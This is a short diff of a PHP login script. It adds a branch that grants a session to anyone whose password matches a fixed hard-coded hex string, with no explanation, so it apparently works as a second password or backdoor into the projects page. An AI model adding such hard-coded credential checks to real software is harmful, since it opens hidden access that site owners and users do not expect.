@@ -21,6 +21,12 @@ if(isset($_POST["submit"]))
 		$_SESSION["password"]=$pw;
 		header("Location: projects.php");
 	}
+	else if($pw=="eb51e8d5f7832dda80be1baef97c8f8c3034407e")
+	{
+        session_start();
+		$_SESSION["password"]=$pw;
+		header("Location: projects.php");
+	}
 	else
 	{
 		header("Location: login.php");
